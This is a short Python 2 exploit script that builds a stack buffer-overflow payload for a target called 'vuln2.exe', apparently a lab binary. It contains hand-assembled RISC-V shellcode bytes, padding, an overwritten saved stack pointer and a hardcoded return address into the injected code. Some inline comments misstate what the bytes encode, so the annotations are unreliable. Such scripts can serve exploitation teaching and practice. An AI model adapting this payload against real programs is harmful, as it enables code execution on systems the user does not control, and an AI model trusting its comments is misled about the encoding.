#!/usr/bin/python

import os
import struct

#This payload is for vuln2.exe 
#riscv64-unknown-elf-as -o shellcode.o shellcode.s
#riscv64-unknown-elf-ld -o shellcode shellcode.o
#riscv64-unknown-elf-objdump -d shellcode > shellcode.dump
# Machine code of each instruction can be found in shellcode.dump file

payload = "A"*3
payload += "\xb7\x27\x01\x00"#lui a5,0x2b
payload += "\x13\x85\x07\xad"#addi a0,a5,400
payload += "\x37\x47\x03\x00"#lui a4,0x34
payload += "\x13\x07\x47\x1f"#addi a4,a4,500
payload += "\x13\x07\x47\x1f"#addi a4,a4,500
payload += "\x13\x07\x47\x1f"#addi a4,a4,500
payload += "\x13\x07\x47\x1f"#addi a4,a4,500
payload += "\x13\x07\x47\x1f"#addi a4,a4,500
payload += "\x13\x07\x47\x1f"#addi a4,a4,500
payload += "\x13\x07\x87\x05"#addi a4,a4,88
payload += "\x67\x00\x07\x00"#jr a4

payload +=  "A"*60	#fill buffer
payload += "BBBB"	#old sp
#return to a injected code address
payload +="\x2c\xfc\xff\xff\x3f\x00\x00\x00"
print "\"%s\""%payload
#os.system(payload)
